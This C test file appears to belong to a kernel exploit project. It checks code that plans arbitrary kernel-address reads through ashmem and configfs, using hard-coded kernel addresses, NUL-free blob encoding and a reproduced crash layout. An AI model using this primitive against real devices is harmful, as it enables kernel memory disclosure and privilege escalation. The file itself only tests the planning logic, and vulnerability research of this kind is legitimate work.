#define _GNU_SOURCE
#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>

#include "../src/08_ashmem_configfs_rw.c"

static void apply_prefix(unsigned char *destination,
                         const unsigned char *source, size_t len) {
  for (size_t i = 0; i < len; i++) {
    destination[i] = source[i] < 2 ? 1 : source[i];
  }
  destination[len] = 0;
}

static void check_blob_encoding(const unsigned char *source, size_t len) {
  unsigned char destination[OSS_ASHMEM_NAME_LEN];
  memset(destination, 0x41, sizeof(destination));
  apply_prefix(destination, source, len);
  for (size_t i = len; i > 0; i--) {
    if (source[i - 1] == 0) {
      apply_prefix(destination, source, i - 1);
    }
  }
  assert(memcmp(destination, source, len) == 0);
}

static void check(uint64_t target, size_t len) {
  struct configfs_read_plan plan;
  assert(make_configfs_read_plan(target, len, &plan));
  assert(plan.page + plan.offset == target);
  assert(plan.kernel_check_len == len);
  assert(OSS_CONFIGFS_COUNT - plan.offset == len);

  unsigned char control[OSS_CONFIGFS_CONTROL_LEN];
  memset(control, 1, sizeof(control));
  memcpy(control + 0x05, &plan.page, sizeof(plan.page));
  memset(control + 0x15, 0, 0x34);
  check_blob_encoding(control, sizeof(control));
}

static uint64_t legacy_next_nonzero_bytes(uint64_t value) {
  for (int shift = 56; shift >= 0; shift -= 8) {
    if (((value >> shift) & 0xffU) == 0) {
      uint64_t lower = (1ULL << shift) - 1;
      return value + (1ULL << shift) - (value & lower) +
             (0x0101010101010101ULL & lower);
    }
  }
  return value;
}

static void reproduce_crash_geometry(void) {
  const uint64_t target = 0xffffff8923636588ULL;
  const size_t len = 8;
  uint64_t base = target - (OSS_CONFIGFS_COUNT - len);
  uint64_t displacement = legacy_next_nonzero_bytes(base) - base;
  assert(displacement == 213);
  assert(len + displacement == 221);

  struct configfs_read_plan plan;
  assert(make_configfs_read_plan(target, len, &plan));
  assert(plan.kernel_check_len == 8);
}

int main(void) {
  check(0xffffff88304aa180ULL, 35);
  check(0xffffff88302e2180ULL, 35);
  check(0xffffff8a2f99a180ULL, 35);
  check(0xffffff8a52aaa180ULL, 35);
  check(0xffffffc00ad64f28ULL, 8);
  check(0xffffff8923636588ULL, 8);
  reproduce_crash_geometry();

  struct configfs_read_plan rejected;
  assert(!make_configfs_read_plan(UINT64_MAX - 3, 8, &rejected));
  assert(!make_configfs_read_plan(0xffffffc00ad64f28ULL, 0, &rejected));
  puts("PASS exact AAR read plans and embedded-NUL encoding");
  return 0;
}
